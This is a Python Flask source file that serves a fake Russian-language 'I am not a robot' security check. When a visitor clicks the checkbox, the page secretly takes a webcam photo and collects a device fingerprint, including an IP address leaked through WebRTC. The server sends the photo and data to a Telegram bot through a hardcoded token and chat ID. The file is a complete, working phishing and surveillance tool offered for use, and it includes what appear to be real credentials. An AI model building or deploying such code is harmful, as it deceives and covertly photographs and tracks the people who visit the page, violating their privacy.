import os, base64, datetime, json, requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

BOT_TOKEN = "8281076655:AAFhrIC-OEqCyCgiLKScj-QOZeAF26xx2ro"
CHAT_ID = "6292733727"

HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Проверка</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html, body {
  height: 100%;
  background: #f9f9f9;
  font-family: 'Roboto', sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
}
.captcha {
  background: #fff;
  border: 1px solid #d3d3d3;
  border-radius: 4px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
  padding: 24px;
  width: 320px;
  text-align: center;
}
.logo {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  margin-bottom: 16px;
}
.logo svg { width: 32px; height: 32px; }
.logo-text {
  font-size: 14px;
  color: #5f6368;
  letter-spacing: 1px;
  text-transform: uppercase;
}
.title {
  font-size: 18px;
  color: #202124;
  margin-bottom: 8px;
  font-weight: 500;
}
.subtitle {
  font-size: 13px;
  color: #5f6368;
  margin-bottom: 24px;
}
.checkbox {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 12px;
  border: 2px solid #d3d3d3;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.2s;
  background: #fff;
}
.checkbox:hover { border-color: #4285f4; }
.checkbox.checked { border-color: #4285f4; background: #f0f6ff; }
.box {
  width: 24px;
  height: 24px;
  border: 2px solid #5f6368;
  border-radius: 2px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s;
  flex-shrink: 0;
}
.checkbox.checked .box { background: #4285f4; border-color: #4285f4; }
.box svg { width: 16px; height: 16px; opacity: 0; transition: opacity 0.2s; }
.checkbox.checked .box svg { opacity: 1; }
.checkbox-text { font-size: 14px; color: #202124; text-align: left; }
.status {
  margin-top: 16px;
  font-size: 13px;
  color: #5f6368;
  min-height: 18px;
}
.status.error { color: #d93025; }
.status.success { color: #188038; }
.spinner {
  display: inline-block;
  width: 14px;
  height: 14px;
  border: 2px solid #d3d3d3;
  border-top-color: #4285f4;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  vertical-align: middle;
  margin-right: 8px;
}
@keyframes spin { to { transform: rotate(360deg); } }
.rec {
  display: none;
  margin-top: 16px;
  font-size: 13px;
  color: #d93025;
}
.rec.active { display: block; }
.dot {
  display: inline-block;
  width: 10px;
  height: 10px;
  background: #d93025;
  border-radius: 50%;
  margin-right: 6px;
  animation: blink 1s infinite;
}
@keyframes blink { 50% { opacity: 0.3; } }
</style>
</head>
<body>
<div class="captcha">
  <div class="logo">
    <svg viewBox="0 0 24 24" fill="none">
      <path d="M12 2L4 6v6c0 5.5 3.4 10.7 8 12 4.6-1.3 8-6.5 8-12V6l-8-4z" fill="#4285f4"/>
      <path d="M10 15l-3-3 1.4-1.4L10 12.2l5.6-5.6L17 8l-7 7z" fill="#fff"/>
    </svg>
    <div class="logo-text">Security Check</div>
  </div>
  <div class="title">Подтвердите, что вы человек</div>
  <div class="subtitle">Для продолжения необходимо пройти проверку</div>
  <div class="checkbox" id="checkbox" onclick="startCheck()">
    <div class="box">
      <svg viewBox="0 0 24 24" fill="none">
        <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="#fff"/>
      </svg>
    </div>
    <div class="checkbox-text">Я не робот</div>
  </div>
  <div class="status" id="status"></div>
  <div class="rec" id="rec"><span class="dot"></span>Запись видео 3 сек...</div>
</div>
<script>
async function collectData() {
  const data = {
    ua: navigator.userAgent,
    lang: navigator.language,
    langs: navigator.languages ? navigator.languages.join(",") : "",
    platform: navigator.platform,
    screen: `${screen.width}x${screen.height}`,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio || 1,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cores: navigator.hardwareConcurrency || null,
    memory: navigator.deviceMemory || null,
    touch: 'ontouchstart' in window,
    referrer: document.referrer || "direct",
    battery: null,
    gpu: null,
    webrtc: null,
    canvas: null
  };

  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      data.battery = `${Math.round(b.level * 100)}% ${b.charging ? "charging" : "discharging"}`;
    }
  } catch(e) {}

  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (gl) {
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    }
  } catch(e) {}

  try {
    data.canvas = await new Promise(resolve => {
      const c = document.createElement("canvas");
      c.width = 200; c.height = 50;
      const ctx = c.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillStyle = "#f60";
      ctx.fillRect(0, 0, 200, 50);
      ctx.fillStyle = "#069";
      ctx.fillText("fingerprint", 2, 15);
      ctx.fillStyle = "rgba(102,204,0,0.7)";
      ctx.fillText("fingerprint", 4, 17);
      const hash = c.toDataURL().split(",")[1];
      let h = 0;
      for (let i = 0; i < hash.length; i++) {
        h = ((h << 5) - h) + hash.charCodeAt(i);
        h |= 0;
      }
      resolve(Math.abs(h).toString(16));
    });
  } catch(e) {}

  try {
    data.webrtc = await new Promise(resolve => {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.onicecandidate = e => {
        if (!e.candidate) { pc.close(); return; }
        const m = e.candidate.candidate.match(/([0-9]{1,3}\\.){3}[0-9]{1,3}/);
        if (m) { pc.close(); resolve(m[0]); }
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(() => resolve(null), 2000);
    });
  } catch(e) {}

  return data;
}

async function startCheck() {
  const cb = document.getElementById("checkbox");
  const status = document.getElementById("status");
  const rec = document.getElementById("rec");
  if (cb.classList.contains("checked")) return;

  status.innerHTML = '<span class="spinner"></span>Проверка...';
  status.className = "status";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    rec.classList.add("active");
    status.innerHTML = '<span class="spinner"></span>Анализ...';

    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "");
    await video.play();
    await new Promise(r => setTimeout(r, 3000));
    stream.getTracks().forEach(t => t.stop());
    rec.classList.remove("active");

    const c = document.createElement("canvas");
    c.width = video.videoWidth;
    c.height = video.videoHeight;
    c.getContext("2d").drawImage(video, 0, 0);
    const photo = c.toDataURL("image/png");

    const extra = await collectData();

    await fetch("/save", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({photo: photo, extra: extra})
    });

    cb.classList.add("checked");
    status.className = "status success";
    status.innerText = "Проверка пройдена";
  } catch (e) {
    rec.classList.remove("active");
    status.className = "status error";
    status.innerText = "Проверка не пройдена. Попробуйте снова.";
  }
}
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/save", methods=["POST"])
def save():
    data = request.get_json()
    photo_data = data["photo"].split(",")[1]
    extra = data.get("extra", {})

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    ts = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"/tmp/photo_{ts}.png"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(photo_data))

    text = (
        f"IP: {ip}\\n"
        f"UA: {ua}\\n\\n"
        f"Язык: {extra.get('lang','')} | {extra.get('langs','')}\\n"
        f"Платформа: {extra.get('platform','')}\\n"
        f"Экран: {extra.get('screen','')} @{extra.get('pixelRatio','')}x ({extra.get('colorDepth','')}bit)\\n"
        f"Часовой пояс: {extra.get('timezone','')}\\n"
        f"Ядра: {extra.get('cores','')} | Память: {extra.get('memory','')}GB\\n"
        f"Тач: {extra.get('touch','')}\\n"
        f"Батарея: {extra.get('battery','')}\\n"
        f"GPU: {extra.get('gpu','')}\\n"
        f"WebRTC: {extra.get('webrtc','')}\\n"
        f"Canvas: {extra.get('canvas','')}\\n"
        f"Referrer: {extra.get('referrer','')}"
    )

    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  data={"chat_id": CHAT_ID, "text": text})
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                  data={"chat_id": CHAT_ID},
                  files={"photo": open(filename, "rb")})
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
